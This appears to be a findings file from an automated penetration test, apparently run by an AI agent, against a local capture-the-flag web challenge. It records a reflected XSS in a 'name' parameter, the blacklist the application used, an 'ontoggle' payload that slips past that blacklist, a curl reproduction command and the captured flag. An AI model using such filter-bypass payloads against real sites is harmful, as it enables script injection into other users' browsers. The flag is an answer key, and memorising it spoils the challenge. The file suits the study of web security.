@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:22:01.128126+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "62f1e032-00b1-4ba6-8110-2116f2290c5c",
+      "timestamp": "2026-04-12T21:22:01.127973+00:00",
+      "title": "Reflected XSS via `name` parameter \u2014 filter bypass with double quotes",
+      "severity": "critical",
+      "target": "http://172.17.0.1:49471/page?name=...",
+      "description": "The `/page` endpoint reflects the `name` GET parameter directly into the HTML page without sanitization. A keyword blacklist blocks `script`, `onerror`, `onload`, and single-quotes (`'`), but allows `ontoggle` event handler with double-quote delimited strings. Payload: `<details open ontoggle=alert(\"XSS\")>` bypasses all filters and executes arbitrary JavaScript. The server validates the XSS execution and returns the CTF flag upon success.",
+      "evidence": "Request: GET /page?name=%3Cdetails+open+ontoggle%3Dalert(%22XSS%22)%3E\n\nResponse body (success):\n<div class=\"solution-text\"><img src=\"static/img/cookies/success_star.png\" alt=\"Correct\" width=\"150\" height=\"150\"><br>Congratulations!<p> Here is the flag: flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}</div>\n\nFLAG: flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl 'http://172.17.0.1:49471/page?name=%3Cdetails+open+ontoggle%3Dalert(%22XSS%22)%3E'",
+        "expected": "Response contains: flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "8e798aa2-3677-40ed-be06-229ff778a3b0",
+      "timestamp": "2026-04-12T21:22:16.355347+00:00",
+      "title": "Dalgona Challenges - Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser (Attacker)\"] --> PageEndpoint[\"/page?name=PAYLOAD\"]\n  PageEndpoint --> Filter[\"Blacklist Filter\\nBlocks: script, onerror, onload, single-quote\"]\n  Filter -->|blocked| ErrorMsg[\"Error: Sorry you can't use: X\"]\n  Filter -->|passed| Reflect[\"Reflect name value into HTML\"]\n  Reflect -->|alert XSS detected| FlagResponse[\"Response: flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}\"]\n  Reflect -->|no alert| FailResponse[\"Response: Failed - Try again\"]\n  Browser --> IndexPage[\"/index (Dalgona Challenges)\"]"
+    }
+  ]
+}
